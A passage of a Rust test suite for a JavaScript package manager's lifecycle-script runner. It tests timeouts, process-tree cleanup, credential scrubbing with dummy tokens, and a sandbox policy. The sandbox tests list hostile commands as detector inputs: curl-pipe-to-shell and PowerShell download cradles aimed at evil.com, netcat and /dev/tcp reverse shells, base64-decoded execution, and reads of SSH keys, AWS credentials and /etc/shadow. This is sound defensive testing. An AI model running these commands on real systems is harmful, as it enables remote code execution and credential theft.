            .expect("Setting 0o755 permissions must succeed");
    }

    let (abort_tx, abort_rx) = tokio::sync::watch::channel(false);
    let abort_fut = async move {
        let mut rx = abort_rx;
        let _ = rx.wait_for(|&v| v).await;
    };

    let script_clone = script.clone();
    let root_buf = root.to_path_buf();
    let exec_task = tokio::spawn(async move {
        execute_binary_with_abort(
            &script_clone,
            &[],
            &root_buf,
            &[],
            &HashMap::new(),
            abort_fut,
        )
        .await
    });

    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    let _ = abort_tx.send(true);

    let res = exec_task.await.unwrap();
    assert!(res.is_err(), "Binary execution must be aborted upon signal");
}

#[tokio::test]
async fn test_execute_workspace_scripts_with_filter_and_scope() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("filter_exec_order.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let mut members = Vec::new();
    let packages = [
        ("@scope/core", "packages/core"),
        ("@scope/ui", "packages/ui"),
        ("app-web", "apps/web"),
        ("app-docs", "apps/docs"),
    ];

    for (name, rel_path) in &packages {
        let pkg_dir = root.join(rel_path);
        std::fs::create_dir_all(&pkg_dir).unwrap();

        let mut manifest = Manifest::default();
        manifest.name = Some(name.to_string());
        manifest.version = Some("1.0.0".to_string());
        manifest.scripts.insert(
            "build".to_string(),
            format!("node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}\\n')\""),
        );

        members.push(WorkspaceScriptMember {
            name: name.to_string(),
            path: pkg_dir,
            manifest,
        });
    }

    // Topological order: @scope/core -> @scope/ui -> app-web -> app-docs
    let topo_order = vec![
        "@scope/core".to_string(),
        "@scope/ui".to_string(),
        "app-web".to_string(),
        "app-docs".to_string(),
    ];

    // 1. Run with filter = Some(vec!["@scope/*"])
    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: Some(vec!["@scope/*".to_string()]),
    };

    let summary = execute_workspace_scripts_topological(root, &members, &topo_order, &opts)
        .await
        .expect("Filtered execution should succeed");

    assert_eq!(summary.executed_packages, vec!["@scope/core", "@scope/ui"]);

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(lines, vec!["@scope/core", "@scope/ui"]);

    // 2. Run with unmatched filter should return error
    let bad_opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: Some(vec!["nonexistent-*".to_string()]),
    };

    let err_res =
        execute_workspace_scripts_topological(root, &members, &topo_order, &bad_opts).await;
    assert!(err_res.is_err());
    let err_msg = err_res.unwrap_err().to_string();
    assert!(err_msg.contains("No workspace packages matched the filter/scope criteria"));
}

#[test]
fn test_is_sensitive_credential_key_expanded() {
    // AWS credentials
    assert!(is_sensitive_credential_key("aws_access_key_id"));
    assert!(is_sensitive_credential_key("AWS_ACCESS_KEY_ID"));
    assert!(is_sensitive_credential_key("aws_secret_access_key"));
    assert!(is_sensitive_credential_key("AWS_SECRET_ACCESS_KEY"));
    assert!(is_sensitive_credential_key("aws_session_token"));

    // SSH agent socket
    assert!(is_sensitive_credential_key("ssh_auth_sock"));
    assert!(is_sensitive_credential_key("SSH_AUTH_SOCK"));

    // JWT
    assert!(is_sensitive_credential_key("jwt"));
    assert!(is_sensitive_credential_key("JWT"));
    assert!(is_sensitive_credential_key("JWT_SECRET"));
    assert!(is_sensitive_credential_key("user_jwt_token"));

    // Deploy, signing, encryption, secret keys
    assert!(is_sensitive_credential_key("deploy_key"));
    assert!(is_sensitive_credential_key("DEPLOY_KEY"));
    assert!(is_sensitive_credential_key("deploykey"));
    assert!(is_sensitive_credential_key("signing_key"));
    assert!(is_sensitive_credential_key("SIGNING_KEY"));
    assert!(is_sensitive_credential_key("signingkey"));
    assert!(is_sensitive_credential_key("encryption_key"));
    assert!(is_sensitive_credential_key("ENCRYPTION_KEY"));
    assert!(is_sensitive_credential_key("encryptionkey"));
    assert!(is_sensitive_credential_key("secret_key"));
    assert!(is_sensitive_credential_key("SECRET_KEY"));
    assert!(is_sensitive_credential_key("secretkey"));

    // Token prefixes
    assert!(is_sensitive_credential_key(
        "ghp_1234567890abcdef1234567890abcdef"
    ));
    assert!(is_sensitive_credential_key("GHP_TOKEN"));
    assert!(is_sensitive_credential_key("github_pat_11AAAAAAA_BBBBBBB"));
    assert!(is_sensitive_credential_key("GITHUB_PAT_TOKEN"));

    // Non-sensitive keys
    assert!(!is_sensitive_credential_key("PATH"));
    assert!(!is_sensitive_credential_key("NODE_ENV"));
    assert!(!is_sensitive_credential_key("AUTHOR"));
    assert!(!is_sensitive_credential_key("npm_package_author"));
    assert!(!is_sensitive_credential_key("AWS_REGION"));
    assert!(!is_sensitive_credential_key("SSH_HOST"));
}

#[test]
fn test_process_environment_credential_scrubbing_live() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let env_dump_file = root.join("env_dump.json");
    let escaped_dump = env_dump_file.to_string_lossy().replace('\\', "/");

    let script = format!(
        "node -e \"require('fs').writeFileSync('{escaped_dump}', JSON.stringify(process.env));\""
    );

    let mut ctx = LifecycleContext::new(root, root, "env-scrub-pkg", "preinstall", &script);

    // Inject all required sensitive keys into extra_env
    ctx.extra_env.insert(
        "AWS_ACCESS_KEY_ID".to_string(),
        "AKIAIOSFODNN7EXAMPLE".to_string(),
    );
    ctx.extra_env.insert(
        "SSH_AUTH_SOCK".to_string(),
        "/tmp/ssh-agent.sock".to_string(),
    );
    ctx.extra_env.insert(
        "JWT".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy".to_string(),
    );
    ctx.extra_env.insert(
        "DEPLOY_KEY".to_string(),
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...".to_string(),
    );
    ctx.extra_env
        .insert("SIGNING_KEY".to_string(), "secsign123".to_string());
    ctx.extra_env
        .insert("ENCRYPTION_KEY".to_string(), "secenc456".to_string());
    ctx.extra_env
        .insert("SECRET_KEY".to_string(), "secval789".to_string());
    ctx.extra_env.insert(
        "ghp_user_token".to_string(),
        "ghp_1234567890abcdef".to_string(),
    );
    ctx.extra_env.insert(
        "github_pat_key".to_string(),
        "github_pat_11ABCD_12345".to_string(),
    );
    ctx.extra_env
        .insert("SAFE_BUILD_VAR".to_string(), "safe_value_xyz".to_string());

    let status = execute_lifecycle_script(&ctx).expect("Execution should succeed");
    assert!(status.success());
    assert!(env_dump_file.exists());

    let dump_content = std::fs::read_to_string(&env_dump_file).unwrap();
    let env_map: HashMap<String, String> = serde_json::from_str(&dump_content).unwrap();

    // Safe variable must be passed
    assert_eq!(env_map.get("SAFE_BUILD_VAR").unwrap(), "safe_value_xyz");

    // All sensitive keys must be scrubbed from process environment
    assert!(!env_map.contains_key("AWS_ACCESS_KEY_ID"));
    assert!(!env_map.contains_key("SSH_AUTH_SOCK"));
    assert!(!env_map.contains_key("JWT"));
    assert!(!env_map.contains_key("DEPLOY_KEY"));
    assert!(!env_map.contains_key("SIGNING_KEY"));
    assert!(!env_map.contains_key("ENCRYPTION_KEY"));
    assert!(!env_map.contains_key("SECRET_KEY"));
    assert!(!env_map.contains_key("ghp_user_token"));
    assert!(!env_map.contains_key("github_pat_key"));
}

#[test]
fn test_log_output_scrub_tokens_and_key_values() {
    let log_sample = "\
[info] AWS Key: aws_access_key_id=AKIAIOSFODNN7EXAMPLE; \
SSH Agent: ssh_auth_sock=/tmp/ssh-agent.sock; \
Auth: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy; \
Key: deploy_key=ssh-rsa AAAAB3NzaC1yc2E...; \
Signing: signing_key=sign_secret_abc; \
Encryption: encryption_key=enc_secret_xyz; \
Secret: secret_key=super_secret_value; \
Token1: ghp_1234567890abcdef1234567890abcdef; \
Token2: github_pat_11AAAAAAA_BBBBBBBB2222222; \
Header: Bearer token_secret_999";

    let scrubbed = scrub_text(log_sample);

    // Verify all sensitive contents are redacted
    assert!(!scrubbed.contains("AKIAIOSFODNN7EXAMPLE"));
    assert!(!scrubbed.contains("/tmp/ssh-agent.sock"));
    assert!(!scrubbed.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy"));
    assert!(!scrubbed.contains("ssh-rsa AAAAB3NzaC1yc2E..."));
    assert!(!scrubbed.contains("sign_secret_abc"));
    assert!(!scrubbed.contains("enc_secret_xyz"));
    assert!(!scrubbed.contains("super_secret_value"));
    assert!(!scrubbed.contains("ghp_1234567890abcdef1234567890abcdef"));
    assert!(!scrubbed.contains("github_pat_11AAAAAAA_BBBBBBBB2222222"));
    assert!(!scrubbed.contains("token_secret_999"));

    // Verify replacements
    assert!(scrubbed.contains("aws_access_key_id=[REDACTED]"));
    assert!(scrubbed.contains("ssh_auth_sock=[REDACTED]"));
    assert!(scrubbed.contains("jwt=[REDACTED]"));
    assert!(scrubbed.contains("deploy_key=[REDACTED]"));
    assert!(scrubbed.contains("signing_key=[REDACTED]"));
    assert!(scrubbed.contains("encryption_key=[REDACTED]"));
    assert!(scrubbed.contains("secret_key=[REDACTED]"));
    assert!(scrubbed.contains("ghp_[REDACTED]"));
    assert!(scrubbed.contains("github_pat_[REDACTED]"));
    assert!(scrubbed.contains("Bearer [REDACTED]"));
}

#[tokio::test]
async fn test_lifecycle_timeout_sync_and_async_exit_code_124() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // 1. Synchronous execution with timeout
    let ctx_sync = LifecycleContext::new(
        root,
        root,
        "timeout-sync-pkg",
        "preinstall",
        "node -e \"setTimeout(() => {}, 60000)\"",
    )
    .with_timeout(std::time::Duration::from_millis(200));

    let start = std::time::Instant::now();
    let sync_res = execute_lifecycle_script(&ctx_sync);
    let elapsed = start.elapsed();

    assert!(
        sync_res.is_err(),
        "Sync script execution must fail upon timeout"
    );
    let err = sync_res.unwrap_err();
    let code = extract_error_exit_code(&err);
    assert_eq!(code, 124, "Timeout must exit with code 124");
    assert!(elapsed < std::time::Duration::from_secs(5));

    // 2. Asynchronous execution with timeout
    let ctx_async = LifecycleContext::new(
        root,
        root,
        "timeout-async-pkg",
        "preinstall",
        "node -e \"setTimeout(() => {}, 60000)\"",
    )
    .with_timeout(std::time::Duration::from_millis(200));

    let start_async = std::time::Instant::now();
    let async_res = execute_lifecycle_script_async(&ctx_async).await;
    let elapsed_async = start_async.elapsed();

    assert!(
        async_res.is_err(),
        "Async script execution must fail upon timeout"
    );
    let err_async = async_res.unwrap_err();
    let code_async = extract_error_exit_code(&err_async);
    assert_eq!(code_async, 124, "Async timeout must exit with code 124");
    assert!(elapsed_async < std::time::Duration::from_secs(5));

    // 3. Topological execution with timeout
    let mut manifest = Manifest::default();
    manifest.name = Some("topo-timeout-pkg".to_string());
    manifest.scripts.insert(
        "install".to_string(),
        "node -e \"setTimeout(() => {}, 60000)\"".to_string(),
    );

    let node = LifecyclePackageNode {
        package_path: "node_modules/topo-timeout-pkg".to_string(),
        disk_path: root.join("node_modules").join("topo-timeout-pkg"),
        manifest,
        source: PackageSource::Registry,
        dependencies: vec![],
        optional: false,
    };
    std::fs::create_dir_all(&node.disk_path).unwrap();

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions::new(root).with_timeout(std::time::Duration::from_millis(250));

    let topo_res = execute_topological(&[node], &root_manifest, &opts).await;
    assert!(
        topo_res.is_err(),
        "Topological execution must fail on timeout"
    );
    let topo_err = topo_res.unwrap_err();
    let topo_code = extract_error_exit_code(&topo_err);
    assert_eq!(
        topo_code, 124,
        "Topological timeout must report exit code 124"
    );
}

#[tokio::test]
async fn test_lifecycle_timeout_terminates_grandchild_process_tree() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let grandchild_pid_file = root.join("grandchild_timeout.pid");
    let escaped_pid_file = grandchild_pid_file.to_string_lossy().replace('\\', "/");

    let script_file = root.join("spawn_timeout_tree.js");
    let script_js = format!(
        "const {{ spawn }} = require('child_process');\n\
        const g = spawn(process.execPath, [\n\
            '-e',\n\
            `require('fs').writeFileSync('{escaped_pid_file}', String(process.pid)); setInterval(() => {{}}, 1000);`\n\
        ], {{ stdio: 'ignore' }});\n\
        setInterval(() => {{}}, 1000);\n"
    );
    std::fs::write(&script_file, script_js).unwrap();

    let escaped_script = script_file.to_string_lossy().replace('\\', "/");
    let script_cmd = format!("node \"{escaped_script}\"");

    let ctx = LifecycleContext::new(
        root,
        root,
        "grandchild-timeout-pkg",
        "preinstall",
        &script_cmd,
    )
    .with_timeout(std::time::Duration::from_secs(120));

    let mut exec_task = tokio::spawn(async move { execute_lifecycle_script_async(&ctx).await });

    // Wait until the grandchild has started and written its PID
    let pid = wait_for_grandchild_pid(&grandchild_pid_file, &mut exec_task).await;
    assert!(
        process_guard::is_process_running(pid),
        "Grandchild process {pid} must be running before timeout"
    );

    let res = exec_task.await.unwrap();
    assert!(res.is_err(), "Execution must fail with timeout error");
    let err = res.unwrap_err();
    assert_eq!(
        extract_error_exit_code(&err),
        124,
        "Timeout must return exit code 124"
    );

    wait_for_process_exit(pid).await;

    // Verify grandchild process is no longer running (contained by Job Object / ProcessTreeGuard)
    assert!(
        !process_guard::is_process_running(pid),
        "Grandchild process {pid} must be terminated when timeout occurs, no orphaned processes"
    );
}

#[tokio::test]
async fn test_sigint_and_sigterm_exit_code_fidelity() {
    // 1. ScriptExitError exit code propagation
    let err_sigint = anyhow::Error::from(ScriptExitError {
        exit_code: 130,
        message: "Interrupted by SIGINT".to_string(),
    });
    assert_eq!(extract_error_exit_code(&err_sigint), 130);

    let err_sigterm = anyhow::Error::from(ScriptExitError {
        exit_code: 143,
        message: "Interrupted by SIGTERM".to_string(),
    });
    assert_eq!(extract_error_exit_code(&err_sigterm), 143);

    let err_timeout = anyhow::Error::from(ScriptExitError {
        exit_code: 124,
        message: "Script timed out".to_string(),
    });
    assert_eq!(extract_error_exit_code(&err_timeout), 124);

    // 2. Abort signal returns exit code 143
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let ctx = LifecycleContext::new(
        root,
        root,
        "sigterm-abort-pkg",
        "preinstall",
        "node -e \"setTimeout(() => {}, 60000)\"",
    );

    let (abort_tx, abort_rx) = tokio::sync::watch::channel(false);
    let abort_fut = async move {
        let mut rx = abort_rx;
        let _ = rx.wait_for(|&v| v).await;
    };

    let exec_task =
        tokio::spawn(async move { execute_lifecycle_script_with_abort(&ctx, abort_fut).await });

    // Allow process to start
    tokio::time::sleep(std::time::Duration::from_millis(150)).await;
    let _ = abort_tx.send(true);

    let res = exec_task.await.unwrap();
    assert!(res.is_err());
    let err = res.unwrap_err();
    assert_eq!(
        extract_error_exit_code(&err),
        143,
        "Abort signal must faithfully propagate exit code 143 (SIGTERM)"
    );

    // 3. ProcessTreeGuard terminate fidelity on Windows
    #[cfg(windows)]
    {
        use std::os::windows::io::AsRawHandle;
        for target_code in [124u32, 130u32, 143u32] {
            let guard = process_guard::ProcessTreeGuard::new().unwrap();
            let mut cmd = std::process::Command::new("node");
            cmd.arg("-e").arg("setTimeout(() => {}, 30000)");
            let mut child = cmd.spawn().expect("Failed to spawn node process");
            assert!(guard.assign_process(child.as_raw_handle()));

            // Terminate with specific exit code
            assert!(guard.terminate(target_code));

            let status = child.wait().expect("Child should wait successfully");
            assert_eq!(
                extract_exit_status_code(&status),
                target_code as i32,
                "ProcessTreeGuard::terminate({target_code}) must terminate process with exact exit code"
            );
        }
    }
}

#[test]
fn test_sync_reaps_descendants_before_waiting_for_pipe_eof() {
    let temp = tempfile::tempdir().unwrap();
    let marker = temp.path().join("orphan-completed");
    let marker_js = serde_json::to_string(&marker.to_string_lossy()).unwrap();
    let grandchild = format!(
        "process.send('ready'); setTimeout(() => {{ require('fs').writeFileSync({marker_js}, 'orphan'); }}, 2000);"
    );
    let script = format!(
        "const g = require('child_process').spawn(process.execPath, ['-e', {}], {{ stdio: ['ignore', 'inherit', 'inherit', 'ipc'] }}); g.on('message', () => {{ console.log('grandchild-ready'); g.disconnect(); g.unref(); }});",
        serde_json::to_string(&grandchild).unwrap()
    );
    let script_file = temp.path().join("parent.cjs");
    std::fs::write(&script_file, script).unwrap();
    let ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "inherited-pipes",
        "install",
        format!("node \"{}\"", script_file.display()),
    )
    .with_capture_output(true)
    .with_timeout(std::time::Duration::from_secs(180));
    let status = execute_lifecycle_script(&ctx).unwrap();
    assert!(status.success());
    assert!(ctx
        .get_captured_output()
        .unwrap()
        .stdout
        .contains("grandchild-ready"));
    assert!(
        !marker.exists(),
        "An inherited output pipe must not keep an orphan alive until natural exit"
    );
}

#[test]
fn test_massive_output_pipe_drain_sync() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let script_file = root.join("emit_sync.js");
    std::fs::write(
        &script_file,
        r#"
const chunk = Buffer.alloc(64 * 1024, 'X');
for (let i = 0; i < 165; i++) {
    process.stdout.write(chunk);
}
process.stdout.write('\nghp_1234567890abcdef1234567890abcdef\n');
process.stdout.write('AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n');

const errChunk = Buffer.alloc(64 * 1024, 'Y');
for (let j = 0; j < 35; j++) {
    process.stderr.write(errChunk);
}
process.stderr.write('\n//registry.npmjs.org/:_authToken=secret_auth_token_9999\n');
process.stderr.write('password=super_secret_pass_123\n');
process.exitCode = 0;
"#,
    )
    .unwrap();

    let escaped = script_file.to_string_lossy().replace('\\', "/");
    let script = format!("node \"{escaped}\"");

    let ctx = LifecycleContext::new(root, root, "massive-output-sync-pkg", "install", &script)
        .with_capture_output(true)
        .with_timeout(std::time::Duration::from_secs(180));

    let start = std::time::Instant::now();
    let status =
        execute_lifecycle_script(&ctx).expect("Sync massive output execution must succeed");
    assert!(status.success(), "Process must exit cleanly with code 0");
    assert!(
        start.elapsed() < std::time::Duration::from_secs(180),
        "Must complete without pipe buffer deadlock"
    );

    let out = ctx
        .get_captured_output()
        .expect("Captured output must be present");
    assert_eq!(out.exit_code, 0);

    // Verify massive output was drained: stdout > 10MB (165 * 64KB ~ 10.8MB)
    assert!(
        out.stdout.len() >= 10 * 1024 * 1024,
        "Stdout must be > 10 MB, was {}",
        out.stdout.len()
    );
    assert!(
        out.stderr.len() >= 2 * 1024 * 1024,
        "Stderr must be > 2 MB, was {}",
        out.stderr.len()
    );

    // Verify credential scrubbing on streaming output chunks
    assert!(!out.stdout.contains("1234567890abcdef1234567890abcdef"));
    assert!(!out.stdout.contains("AKIAIOSFODNN7EXAMPLE"));
    assert!(out.stdout.contains("ghp_[REDACTED]"));
    assert!(
        out.stdout.contains("AWS_ACCESS_KEY_ID=[REDACTED]")
            || out.stdout.contains("aws_access_key_id=[REDACTED]")
    );

    assert!(!out.stderr.contains("secret_auth_token_9999"));
    assert!(!out.stderr.contains("super_secret_pass_123"));
    assert!(
        out.stderr.contains("_authToken=[REDACTED]")
            || out.stderr.contains("_authtoken=[REDACTED]")
    );
    assert!(out.stderr.contains("password=[REDACTED]"));
}

#[tokio::test]
async fn test_massive_output_pipe_drain_async() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let script_file = root.join("emit_async.js");
    std::fs::write(
        &script_file,
        r#"
const chunk = Buffer.alloc(64 * 1024, 'A');
for (let i = 0; i < 170; i++) {
    process.stdout.write(chunk);
}
process.stdout.write('\ngithub_pat_11AAAAAAA_BBBBBBBB2222222\n');
process.stdout.write('JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy\n');

const errChunk = Buffer.alloc(64 * 1024, 'B');
for (let j = 0; j < 35; j++) {
    process.stderr.write(errChunk);
}
process.stderr.write('\nssh_auth_sock=/tmp/ssh-agent.sock\n');
process.stderr.write('_authToken=super_secret_auth_token_chunk6\n');
process.exitCode = 0;
"#,
    )
    .unwrap();

    let escaped = script_file.to_string_lossy().replace('\\', "/");
    let script = format!("node \"{escaped}\"");

    let ctx = LifecycleContext::new(
        root,
        root,
        "massive-output-async-pkg",
        "postinstall",
        &script,
    )
    .with_capture_output(true)
    .with_timeout(std::time::Duration::from_secs(180));

    let start = std::time::Instant::now();
    let status = execute_lifecycle_script_async(&ctx)
        .await
        .expect("Async massive output execution must succeed");
    assert!(status.success(), "Process must exit cleanly with code 0");
    assert!(
        start.elapsed() < std::time::Duration::from_secs(180),
        "Must complete without pipe buffer deadlock"
    );

    let out = ctx
        .get_captured_output()
        .expect("Captured output must be present");
    assert_eq!(out.exit_code, 0);

    // Verify massive output was drained: stdout > 10MB
    assert!(
        out.stdout.len() >= 10 * 1024 * 1024,
        "Stdout must be > 10 MB, was {}",
        out.stdout.len()
    );
    assert!(
        out.stderr.len() >= 2 * 1024 * 1024,
        "Stderr must be > 2 MB, was {}",
        out.stderr.len()
    );

    // Verify credential scrubbing on streaming output chunks
    assert!(!out.stdout.contains("github_pat_11AAAAAAA_BBBBBBBB2222222"));
    assert!(!out
        .stdout
        .contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy"));
    assert!(out.stdout.contains("github_pat_[REDACTED]"));
    assert!(out.stdout.contains("JWT=[REDACTED]") || out.stdout.contains("jwt=[REDACTED]"));

    assert!(!out.stderr.contains("/tmp/ssh-agent.sock"));
    assert!(!out.stderr.contains("super_secret_auth_token_chunk6"));
    assert!(
        out.stderr.contains("ssh_auth_sock=[REDACTED]")
            || out.stderr.contains("SSH_AUTH_SOCK=[REDACTED]")
    );
    assert!(
        out.stderr.contains("_authToken=[REDACTED]")
            || out.stderr.contains("_authtoken=[REDACTED]")
    );
}

#[test]
fn test_sandbox_policy_disabled_level() {
    let policy = ScriptSandboxPolicy::disabled();
    assert_eq!(policy.level, SandboxLevel::Disabled);

    let err = policy
        .check_execution_allowed("any-pkg", "echo 1")
        .unwrap_err();
    assert!(matches!(err, LifecycleError::ScriptsDisabled));
}

#[tokio::test]
async fn test_sandbox_policy_disabled_topological_skips() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let mut manifest = Manifest::default();
    manifest.name = Some("disabled-pkg".to_string());
    // If executed, this would fail or write a file, but disabled skips entirely
    manifest.scripts.insert(
        "postinstall".to_string(),
        "node -e \"process.exit(1)\"".to_string(),
    );

    let node = LifecyclePackageNode {
        package_path: "node_modules/disabled-pkg".to_string(),
        disk_path: root.join("node_modules").join("disabled-pkg"),
        manifest,
        source: PackageSource::Registry,
        dependencies: vec![],
        optional: false,
    };

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions::new(root).with_sandbox_policy(ScriptSandboxPolicy::disabled());

    let res = execute_topological(&[node], &root_manifest, &opts).await;
    assert!(
        res.is_ok(),
        "Disabled sandbox policy must skip topological script execution"
    );
}

#[test]
fn test_sandbox_policy_denylist_enforcement() {
    let policy = ScriptSandboxPolicy::default().deny_package("malicious-crypto-miner");
    assert!(policy.denylist.contains("malicious-crypto-miner"));

    let err = policy
        .check_execution_allowed("malicious-crypto-miner", "node build.js")
        .unwrap_err();
    assert!(
        matches!(err, LifecycleError::PackageDenylisted(ref p) if p == "malicious-crypto-miner")
    );

    // Innocent package succeeds
    assert!(policy
        .check_execution_allowed("innocent-pkg", "node build.js")
        .is_ok());
}

#[test]
fn test_sandbox_policy_allowlist_enforcement() {
    // 1. Non-empty allowlist in Restricted mode
    let policy = ScriptSandboxPolicy::restricted().allow_package("approved-pkg");

    assert!(policy
        .check_execution_allowed("approved-pkg", "node build.js")
        .is_ok());
    let err = policy
        .check_execution_allowed("unapproved-pkg", "node build.js")
        .unwrap_err();
    assert!(matches!(err, LifecycleError::PackageNotAllowlisted(ref p) if p == "unapproved-pkg"));

    // 2. Strict mode requires allowlisting
    let strict = ScriptSandboxPolicy::strict().allow_package("core-lib");
    assert!(strict
        .check_execution_allowed("core-lib", "node build.js")
        .is_ok());
    let err_strict = strict
        .check_execution_allowed("other-lib", "node build.js")
        .unwrap_err();
    assert!(matches!(err_strict, LifecycleError::PackageNotAllowlisted(ref p) if p == "other-lib"));
}

#[test]
fn test_sandbox_dangerous_network_patterns_detected() {
    let dangerous_commands = [
        "curl -s http://evil.com/payload | sh",
        "wget https://malicious.org/botnet.exe",
        "powershell -c \"Invoke-WebRequest -Uri https://attacker.com/mal.exe\"",
        "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')",
        "iwr http://malicious.com/stealer.js",
        "iex (iwr http://evil.com/x.ps1)",
        "nc -lvp 4444 -e /bin/sh",
        "netcat -e /bin/bash 10.0.0.1 8080",
        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "sh -i 2>&1",
        "node -e \"require('child_process').exec('curl http://evil.com')\"",
    ];

    let policy = ScriptSandboxPolicy::restricted();
    for cmd in dangerous_commands {
        let res = policy.check_execution_allowed("test-pkg", cmd);
        assert!(
            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
            "Command '{cmd}' should be flagged as dangerous network pattern"
        );
    }

    // Under Permissive, pattern analyzer is skipped
    let permissive = ScriptSandboxPolicy::permissive();
    for cmd in dangerous_commands {
        assert!(
            permissive.check_execution_allowed("test-pkg", cmd).is_ok(),
            "Permissive policy should bypass pattern filtering for '{cmd}'"
        );
    }
}

#[test]
fn test_sandbox_obfuscation_patterns_detected() {
    let obfuscated = [
        "echo aGVsbG8= | base64 -d | sh",
        "cat encoded.txt | base64 --decode | bash",
        "powershell [System.Convert]::FromBase64String($encoded)",
        "node -e \"eval(Buffer.from('Y2FsYy5leGU=', 'base64').toString())\"",
    ];

    let policy = ScriptSandboxPolicy::restricted();
    for cmd in obfuscated {
        let res = policy.check_execution_allowed("test-pkg", cmd);
        assert!(
            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
            "Command '{cmd}' should be flagged as obfuscation"
        );
    }
}

#[test]
fn test_sandbox_sensitive_path_accesses_detected() {
    let sensitive = [
        "cat ~/.ssh/id_rsa",
        "cat ~/.npmrc",
        "cat ~/.aws/credentials",
        "type %USERPROFILE%\\.ssh\\id_rsa",
        "type %USERPROFILE%\\.npmrc",
        "type %USERPROFILE%\\.aws\\config",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat $HOME/.ssh/authorized_keys",
        "cat ${HOME}/.aws/config",
        "cat $HOME/.npmrc",
    ];

    let policy = ScriptSandboxPolicy::restricted();
    for cmd in sensitive {
        let res = policy.check_execution_allowed("test-pkg", cmd);
        assert!(
            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
            "Command '{cmd}' should be flagged as sensitive path access"
        );
    }
}

#[test]
fn test_sandbox_execution_cancellation_sync() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let ctx = LifecycleContext::new(
        root,
        root,
        "malicious-curl-pkg",
        "postinstall",
        "curl http://evil.com/payload.sh",
    )
    .with_sandbox_policy(ScriptSandboxPolicy::restricted());

    // In restricted sandbox, must fail and cancel execution before spawning process
    let res = execute_lifecycle_script(&ctx);
    assert!(
        res.is_err(),
        "Dangerous script must fail synchronously before spawn in restricted sandbox"
    );
    let err_str = res.unwrap_err().to_string();
    assert!(err_str.contains("Dangerous command pattern detected"));
    assert!(err_str.contains("curl"));
}

#[tokio::test]
async fn test_sandbox_execution_cancellation_async() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let ctx = LifecycleContext::new(
        root,
        root,
        "malicious-ssh-pkg",
        "preinstall",
        "cat ~/.ssh/id_rsa",
    )
    .with_sandbox_policy(ScriptSandboxPolicy::restricted());

    // In restricted sandbox, must fail and cancel async execution
    let res = execute_lifecycle_script_async(&ctx).await;
    assert!(
        res.is_err(),
        "Dangerous script must fail asynchronously before spawn in restricted sandbox"
    );
    let err_str = res.unwrap_err().to_string();
    assert!(err_str.contains("Dangerous command pattern detected"));
    assert!(err_str.contains("~/.ssh"));
}

#[test]
fn test_default_policy_permissive_npm_parity_allows_native_builds() {
    let default_policy = ScriptSandboxPolicy::default();
    assert_eq!(default_policy.level, SandboxLevel::Permissive);
    assert!(default_policy.level.is_permissive());

    // Standard native build tool invocations must all be allowed by default
    let native_commands = [
        "node-gyp rebuild",
        "python binding.py",
        "python3 configure.py",
        "make -C build",
        "cl.exe /c addon.cc",
        "cmake --build .",
        "cmake-js compile",
        "ninja -C out/Release",
        "msbuild Addon.sln",
        "node -e \"console.log('build ready')\"",
    ];

    for cmd in native_commands {
        assert!(
            default_policy
                .check_execution_allowed("native-addon-pkg", cmd)
                .is_ok(),
            "Default permissive policy should allow native build command: '{cmd}'"
        );
    }
}

#[test]
fn test_opt_in_strict_sandbox_policy_enforcement() {
    let strict_policy = ScriptSandboxPolicy::restricted();
    assert_eq!(strict_policy.level, SandboxLevel::Restricted);
    assert!(strict_policy.level.is_restricted());

    // Standard native builds without dangerous patterns are still permitted
    assert!(strict_policy
        .check_execution_allowed("native-pkg", "node-gyp rebuild")
        .is_ok());
    assert!(strict_policy
        .check_execution_allowed("native-pkg", "cmake --build .")
        .is_ok());

    // But dangerous network / sensitive patterns are blocked in restricted mode
    assert!(strict_policy
        .check_execution_allowed("bad-pkg", "curl http://evil.com")
        .is_err());
    assert!(strict_policy
        .check_execution_allowed("bad-pkg", "cat ~/.ssh/id_rsa")
        .is_err());
}

#[test]
fn test_sandbox_job_object_process_limits_initialization() {
    let guard_default = process_guard::ProcessTreeGuard::new();
    assert!(guard_default.is_some());

    let guard_limited = process_guard::ProcessTreeGuard::new_with_limits(Some(8));
    assert!(guard_limited.is_some());
}

#[tokio::test]
async fn test_workspace_script_hook_sequencing_pre_main_post() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

